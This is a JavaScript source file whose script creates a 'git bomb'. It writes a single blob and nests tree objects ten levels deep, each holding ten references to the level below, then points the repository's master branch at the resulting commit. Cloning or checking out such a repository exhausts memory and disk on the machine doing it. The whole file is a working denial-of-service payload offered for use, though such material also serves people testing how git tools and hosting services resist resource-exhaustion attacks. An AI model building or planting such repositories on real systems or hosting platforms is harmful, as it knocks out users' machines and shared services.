'use strict';

const asyncReduce = require('p-reduce');
const range = require('lodash.range');
const { promisify } = require('util');
const tmpFile = promisify(require('tmp').file);
const writeFile = promisify(require('fs').writeFile);
const exec = promisify(require('child_process').execFile);

// writes a git object and returns the hash
const writeObject = async (objectBody, { type }) => {
  const path = await tmpFile();
  await writeFile(path, objectBody);

  const { stdout } = await exec('git', ['hash-object', '-w', '-t', type, path]);
  return stdout.replace(/\n/, '');
};

// writes a git commit and returns the hash
const writeCommit = async treeHash => {
  const commitMessage = '"create a git bomb"';
  const { stdout } = await exec('git', ['commit-tree', '-m', commitMessage, treeHash]);
  return stdout;
};

const by = key => (a, b) => a[key] === b[key] ? 0 : a[key] < b[key] ? 1 : -1;

// makes a valid git tree object
const createTree = (dirs, perm) => {
  const tree = dirs.sort(by('name')).reduce((prevBuffer, { name, hash }) => {
    const nextBuffer = [
      Buffer.from(perm, 'ascii'),
      Buffer.from([0x20]),
      Buffer.from(name, 'ascii'),
      Buffer.from([0x00]),
      Buffer.from(hash, 'hex')
    ];

    return Buffer.concat([prevBuffer, ...nextBuffer]);
  }, Buffer.from([]));

  return tree;
};

const filePerms = '100644';
const treePerms = '40000';

if (require.main === module) {
  process.on('unhandledRejection', ({ message, code }) => {
    console.error(message);
    process.exit(code);
  });

  (async () => {
    const depth = 10;             // how many layers deep
    const width = 10;             // how many files or folders per depth level
    const blobBody = 'one laugh'; // content of blob at bottom

    // create base blob
    const blobHash = await writeObject(Buffer.from(blobBody, 'ascii'), {type: 'blob'});

    // write tree object containing the blob `width` times
    const dirs = range(width).map(i => ({name: `f${i}`, hash: blobHash}));
    const rootHash = await writeObject(createTree(dirs, filePerms), {type: 'tree'});

    // make layers of tree objects using the previous tree object
    // each tree contains the last tree `width` times
    const treeHash = await asyncReduce(range(depth - 1), async prevHash => {
      const otherDirs = range(width).map(i => ({name: `d${i}`, hash: prevHash}));

      const nextHash = await writeObject(createTree(otherDirs, treePerms), {type: 'tree'});
      return nextHash;
    }, rootHash);

    // create a commit pointing at our topmost tree
    const commitHash = await writeCommit(treeHash);

    // update master ref to point to new commit
    await writeFile('.git/refs/heads/master', commitHash);
  })();
}
